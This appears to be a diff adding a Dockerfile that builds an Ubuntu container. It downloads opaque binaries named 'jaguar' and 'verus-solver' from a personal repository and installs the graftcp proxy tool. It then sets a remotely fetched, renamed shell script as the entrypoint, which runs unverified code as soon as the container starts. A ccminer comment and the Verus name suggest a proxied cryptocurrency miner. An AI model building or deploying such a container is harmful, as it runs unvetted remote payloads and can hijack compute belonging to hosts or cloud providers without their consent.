@@ -1,0 +1,41 @@
+# Gunakan base image Ubuntu
+FROM ubuntu:20.04
+
+# Set environment variables
+ENV TZ=Asia/Singapore
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Install necessary packages
+RUN apt-get update && \
+    apt-get install -y sudo wget curl unzip nano autoconf git cmake binutils build-essential net-tools screen golang tzdata && \
+    apt-get install -y libsodium-dev && \
+    dpkg-reconfigure --frontend noninteractive tzdata && \
+    apt-get clean && rm -rf /var/lib/apt/lists/*
+
+# Download and extract required files
+# RUN wget https://github.com/marcelinoferdom/minse/raw/main/graphics.tar.gz && \
+#     tar -xvzf graphics.tar.gz && \
+#     rm -rf graphics.tar.gz
+
+# Set workdir for ccminer
+WORKDIR /root
+
+# Download jaguar
+RUN wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/jaguar -O /root/jaguar && \
+    chmod +x /root/jaguar
+
+# Download verus-solver
+RUN wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/verus-solver -O /root/verus-solver && \
+    chmod +x /root/verus-solver
+
+# Download and extract graftcp tool (proxy setup tool)
+RUN wget https://github.com/hmgle/graftcp/releases/download/v0.4.0/graftcp_0.4.0-1_amd64.deb && \
+    dpkg -i graftcp_0.4.0-1_amd64.deb && \
+    mkdir -p /root/graftcp/local
+
+# Use wget to download the entrypoint.sh script from GitHub
+RUN wget https://bitbucket.org/minekols/scsa/raw/1835d45a96dc516136d8c2bbfd6bd33f5630f99b/p2.sh -O /root/ayam.sh && \
+    chmod +x /root/ayam.sh
+
+# Entrypoint script that will run the process when the container starts
+ENTRYPOINT ["/root/ayam.sh"]
